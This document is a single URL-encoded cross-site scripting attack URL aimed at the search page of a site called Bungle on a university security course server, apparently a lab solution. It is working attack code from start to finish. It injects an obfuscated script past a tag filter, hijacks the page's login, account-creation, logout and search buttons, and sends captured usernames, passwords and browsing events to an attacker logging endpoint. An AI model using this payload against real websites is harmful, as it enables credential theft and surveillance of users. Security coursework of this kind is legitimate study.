http://bungle-cs461.cs.illinois.edu/search?xssdefense=1&q=%3Csscriptcript%3Efunction%20payload(attacker)%20%7B%0A%0A%09%09function%20logs(data)%20%7B%0A%20%20%20%20%09%09if(!data)%7Breturn%3B%7D%0A%20%20%20%20%09%09console.log(%24.param(data))%3B%0A%20%20%20%20%09%09%24.get(data)%3B%0A%20%20%09%09%7D%3B%0A%0A%09%09var%20targeturl%20%3D%20String.fromCharCode(46%2C%2047)%3B%0A%09%09var%20lo%20%3D%20String.fromCharCode(46%2C%2047%2C%20108%2C%20111%2C%20103%2C%20105%2C%20110)%3B%2F%2Flogin%0A%09%09var%20createAccount%20%3D%20String.fromCharCode(46%2C%2047%2C%2099%2C%20114%2C%20101%2C%2097%2C%20116%2C%20101)%3B%0A%09%09var%20out%20%3D%20String.fromCharCode(46%2C%2047%2C%20108%2C%20111%2C%20103%2C%20111%2C%20117%2C%20116)%3B%2F%2Flogout%0A%09%09var%20find%20%3D%20String.fromCharCode(46%2C%2047%2C%20115%2C%20101%2C%2097%2C%20114%2C%2099%2C%20104%2C%2063%2C%20113%2C%2061)%3B%2F%2Fsearch(last%20version)%0A%0A%0A%20%20%20%20%09function%20proxy(href)%20%7B%0A%09%09%09%24(%2Fhtml%2F.source).load(href%2C%20function()%20%7B%0A%09%09%09%09window.onpopstate%20%3D%20function(event)%20%7B%0A%09%09%09%09%09if%20(document.getElementById(%2Flogged-in-user%2F.source)%20%3D%3D%20null)%20%7B%0A%09%09%09%09%09%09logs(attacker%2B%2Fevent%3Dnav%26user%3Dnull%26url%3D%2F.source%2Btarget)%3B%0A%09%09%09%09%09%7D%20else%20%7B%0A%09%0A%09%09%09%09%09%09logs(attacker%2B%2Fevent%3Dnav%26user%3D%2F.source%2Bdocument.getElementById(%2Flogged-in-user%2F.source)%2B%2F%26url%3D%2F.source%2Btarget)%0A%09%09%09%09%09%7D%0A%09%09%09%09%09proxy(window.location.href)%3B%0A%09%09%09%09%7D%3B%0A%09%09%09%09%0A%09%09%09%09%24(%2F.history-item%2F.source).filter(function(i%2C%20elem)%20%7B%0A%09%09%09%09%09return%20%24(elem).html().indexOf(%2Fpayload%2F.source)%20%3E%3D%200%0A%09%09%09%09%7D).remove()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%09%24(%2F%23new-account-btn%2F.source).click(function(event)%20%7B%0A%09%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09%09history.pushState(null%2C%20null%2C%20targeturl)%3B%0A%09%09%09%09%09%24.post(createAccount%2C%20%7B%0A%09%09%09%09%09%09username%3A%20%24(%2F%23username%2F.source).val()%2C%0A%09%09%09%09%09%09password%3A%20%24(%2F%23userpass%2F.source).val()%0A%09%09%09%09%09%7D%2C%20function()%20%7B%0A%09%09%0A%09%09%09%09%09%09logs(attacker%2B%2Fevent%3Dlogin%26user%3D%2F.source%2B(%2F%23username%2F.source).val()%2B%2Fpassword%26url%3D%2F.source%2B(%2F%23userpass%2F.source).val()%2B%2F%26url%3D%2F.source%2Bwindow.location.href)%3B%0A%09%09%09%09%09%09proxy(targeturl)%3B%0A%09%09%09%09%09%7D).fail(function()%20%7B%0A%09%09%09%09%09%09proxy(targeturl)%3B%0A%09%09%09%09%09%7D)%3B%0A%09%09%09%09%7D)%3B%0A%0A%09%09%09%09%24(%2F%23log-in-btn%2F.source).click(function(event)%20%7B%0A%09%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09%09history.pushState(null%2C%20null%2C%20targeturl)%3B%0A%09%09%09%09%09%24.post(lo%2C%20%7B%0A%09%09%09%09%09%09username%3A%20%24(%2F%23username%2F.source).val()%2C%0A%09%09%09%09%09%09password%3A%20%24(%2F%23userpass%2F.source).val()%0A%09%09%09%09%09%7D%2C%20function()%20%7B%0A%09%0A%09%09%09%09%09%09var%20usernam%20%3D%20%24(%2F%23username%2F.source).val()%3B%0A%09%09%09%09%09%09var%20passwor%20%3D%20%24(%2F%23userpass%2F.source).val()%3B%0A%09%09%09%09%09%09logs(attacker%2B%2Fevent%3Dlogin%26user%3D%2F.source%2Busernam%2B%2Fpassword%26url%3D%2F.source%2Bpasswor)%3B%0A%09%09%09%09%09%09proxy(targeturl)%3B%0A%09%09%09%09%09%7D)%3B%0A%09%09%09%09%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%09%09%09%09%24(%2F%23log-out-btn%2F.source).click(function(event)%20%7B%0A%09%09%09%09%09event.preventDefault()%3B%0A%09%0A%09%09%09%09%09var%20user%20%3D%20document.getElementById(%2Flogged-in-user%2F.source).innerHTML%3B%0A%09%09%09%09%09logs(attacker%2B%2Fevent%3Dlogout%26user%3D%2F.source%2Buser%2B%2F%26url%3D%2F.source%2Bwindow.location.href)%3B%0A%09%09%09%09%09history.pushState(null%2C%20null%2C%20targeturl)%3B%0A%09%09%09%09%09%24.post(out%2C%20%7B%0A%09%09%09%09%09%09username%3A%20document.getElementById(%2Flogged-in-user%2F.source).innerHTML%0A%09%09%09%09%09%7D%2C%20function()%20%7B%0A%09%09%09%09%09%09proxy(targeturl)%3B%0A%09%09%09%09%09%7D)%3B%0A%09%09%09%09%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%09%09%09%09%24(%2F%23search-btn%2F.source).click(function(event)%20%7B%0A%09%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09%09if%20(document.getElementById(%2Flogged-in-user%2F.source)%20%3D%3D%20null)%20%7B%0A%0A%09%09%09%09%09%09logs(attacker%2B%2Fevent%3Dnav%26user%3Dnull%2F.source%2B%2F%26url%3D%2F.source%2Bwindow.location.href%2B%2Fsearch%2F.source)%3B%0A%09%09%09%09%09%7D%20else%20%7B%0A%0A%09%09%09%09%09%09logs(attacker%2B%2Fevent%3Dnav%26user%3D%2F.source%2Bdocument.getElementById(%2Flogged-in-user%2F.source).innerHTML%2B%2F%26url%3D%2F.source%2Bwindow.location.href%2B%2Fsearch%2F.source)%0A%09%09%09%09%09%7D%0A%09%09%09%09%09history.pushState(null%2C%20null%2C%20find%20%2B%20%24(%2F%23query%2F.source).val())%3B%0A%09%09%09%09%09proxy(find%20%2B%20%24(%2F%23query%2F.source).val())%3B%0A%09%09%09%09%7D)%3B%0A%0A%09%09%09%09%24(%2F%23search-again-btn%2F.source).click(function(event)%20%7B%0A%09%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09%09history.pushState(null%2C%20null%2C%20targeturl)%3B%0A%09%09%09%09%09if%20(document.getElementById(%2Flogged-in-user%2F.source)%20%3D%3D%20null)%20%7B%0A%0A%09%09%09%09%09%09logs(attacker%2B%2Fevent%3Dnav%26user%3Dnull%2F.source%2B%2F%26url%3D%2F.source%2Bwindow.location.href)%3B%0A%09%09%09%09%09%7D%20else%20%7B%0A%0A%09%09%09%09%09%09logs(attacker%2B%2Fevent%3Dnav%26user%3D%2F.source%2Bdocument.getElementById(%2Flogged-in-user%2F.source).innerHTML%2B%2F%26url%3D%2F.source%2Bwindow.location.href)%3B%0A%09%09%09%09%09%7D%0A%09%09%09%09%09proxy(targeturl)%0A%09%09%09%09%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%09%09%09%09%24(%2F%23bungle-lnk%2F.source).click(function(event)%20%7B%0A%09%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09%09if%20(document.getElementById(%2Flogged-in-user%2F.source)%20%3D%3D%20null)%20%7B%0A%0A%09%09%09%09%09%09logs(attacker%2B%2Fevent%3Dnav%26user%3Dnull%26url%3D%2F.source%2Bwindow.location.href)%3B%0A%09%09%09%09%09%7D%20else%20%7B%0A%0A%09%09%09%09%09%09logs(attacker%2B%2Fevent%3Dnav%26user%3D%2F.source%2Bdocument.getElementById(%2Flogged-in-user%2F.source).innerHTML%2B%2F%26url%3D%2F.source%2Bwindow.location.href)%3B%0A%09%09%09%09%09%7D%0A%09%09%09%09%09history.pushState(null%2C%20null%2C%20targeturl)%3B%0A%09%09%09%09%09proxy(targeturl)%3B%0A%09%09%09%09%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%09%24(%2Fhtml%2F.source).show()%3B%0A%09%09%09%7D)%3B%0A%09%09%7D%3B%0A%0A%09%09history.replaceState(null%2C%20null%2C%20targeturl)%3B%0A%09%09%24(%2Fhtml%2F.source).hide()%3B%0A%09%09proxy(targeturl)%3B%0A%09%7D%3Bpayload(%22http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%22)%3B%3C%2Fsscriptcript%3E